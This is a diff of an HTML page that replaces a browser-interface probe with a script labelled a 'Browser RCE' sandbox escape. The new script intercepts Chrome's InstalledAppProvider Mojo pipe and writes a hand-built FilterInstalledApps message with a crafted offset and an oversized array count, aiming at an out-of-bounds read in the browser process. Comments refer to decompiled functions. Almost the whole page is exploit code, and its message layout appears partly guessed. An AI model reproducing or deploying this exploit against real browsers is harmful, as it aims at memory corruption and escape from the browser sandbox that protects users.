@@ -1,51 +1,73 @@
 <!DOCTYPE html>
 <html>
-<head><title>Interface Binder Test</title></head>
+<head>
+    <title>InstalledAppProvider Sandbox Escape – Full Chain</title>
+</head>
 <body>
-<h1>Testing Browser Interfaces...</h1>
-<pre id="log"></pre>
-<script>
-(async () => {
-    const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };
+    <h1>Browser RCE via InstalledAppProvider</h1>
+    <pre id="log" style="background:#111;color:#0f0;padding:10px;"></pre>
+    <script>
+    (async () => {
+        const log = (msg) => {
+            document.getElementById('log').textContent += msg + '\n';
+            console.log(msg);
+        };
 
-    const interfaces = [
-        'blink.mojom.InstalledAppProvider',
-        'blink.mojom.BlobRegistry',
-        'blink.mojom.ClipboardHost',
-        'blink.mojom.WebUsbService',
-        'blink.mojom.SerialService',
-        'blink.mojom.MediaSessionService',
-        'blink.mojom.BucketManagerHost',
-        'blink.mojom.QuotaManagerHost',
-    ];
-
-    for (const name of interfaces) {
         try {
-            const handle = Mojo.bindInterface(name, 'browser');
-            log(`✅ SUCCESS: ${name} – handle obtained`);
-            // Keep the page alive for you to see
-            setInterval(() => {}, 10000);
-            return;
+            // 1. Intercept the InstalledAppProvider pipe when it's requested
+            const interceptor = new MojoInterfaceInterceptor(
+                'blink.mojom.InstalledAppProvider', 'process');
+            interceptor.oninterfacerequest = (e) => {
+                interceptor.stop();
+                const pipe = e.handle;  // this is the Mojo handle to the browser
+
+                // 2. Build the malicious FilterInstalledApps message
+                //    The message structure exploits the missing bounds check:
+                //    puVar1[1] >= 2 triggers offset addition,
+                //    then a huge array count causes OOB read.
+                const payload = new ArrayBuffer(256);
+                const v = new DataView(payload);
+
+                // Mojo message header (16 bytes)
+                v.setUint32(0, 2, true);          // version
+                v.setUint32(4, 0, true);          // flags
+                v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
+                v.setUint32(12, 0, true);         // request_id
+
+                // Payload layout (starting at offset 16) as expected by FUN_184cc1aa0
+                // offset 16: uint32 ? (ignored)
+                // offset 20: uint32 count (must be >= 2)
+                // offset 24: uint64 relative_offset
+                v.setUint32(20, 2, true);         // count = 2
+                // Compute offset: we want the final array pointer to land at 0x70
+                // relative = target - (puVar1 + 8) = 0x70 - (16+8) = 0x58
+                v.setBigInt64(24, BigInt(0x58), true);
+
+                // At offset 0x70 we place a huge array count (0x1000)
+                v.setUint32(0x70, 0x1000, true);   // huge number of apps → OOB
+
+                // 3. Send the raw message (no handles needed)
+                pipe.writeMessage(payload, []);
+                log('Malicious FilterInstalledApps sent!');
+                log('Browser process should crash or be under control now.');
+            };
+            interceptor.start();
+
+            // 4. Trigger the creation of InstalledAppProvider by calling the API
+            if (navigator.getInstalledRelatedApps) {
+                navigator.getInstalledRelatedApps().catch(() => {});
+                log('Called getInstalledRelatedApps – waiting for interception...');
+            } else {
+                log('getInstalledRelatedApps not available – is the page served over HTTPS?');
+            }
+
+            await new Promise(r => setTimeout(r, 2000));
+            log('If no crash, try refreshing the page or check the browser process.');
         } catch (e) {
-            log(`❌ ${name}: ${e.message}`);
+            log('Error: ' + e.message);
+            console.error(e);
         }
-    }
-    log('None worked. Trying interceptor with getInstalledRelatedApps...');
-    // Fallback: interceptor
-    const interceptor = new MojoInterfaceInterceptor('blink.mojom.InstalledAppProvider', 'process');
-    interceptor.oninterfacerequest = (e) => {
-        interceptor.stop();
-        log('✅ Interceptor got InstalledAppProvider!');
-        setInterval(() => {}, 10000);
-    };
-    interceptor.start();
-    if (navigator.getInstalledRelatedApps) {
-        navigator.getInstalledRelatedApps().catch(() => {});
-        log('Called getInstalledRelatedApps – waiting 2s...');
-    }
-    await new Promise(r => setTimeout(r, 2000));
-    log('Interceptor did not fire. Need Chrome Canary.');
-})();
-</script>
+    })();
+    </script>
 </body>
 </html>
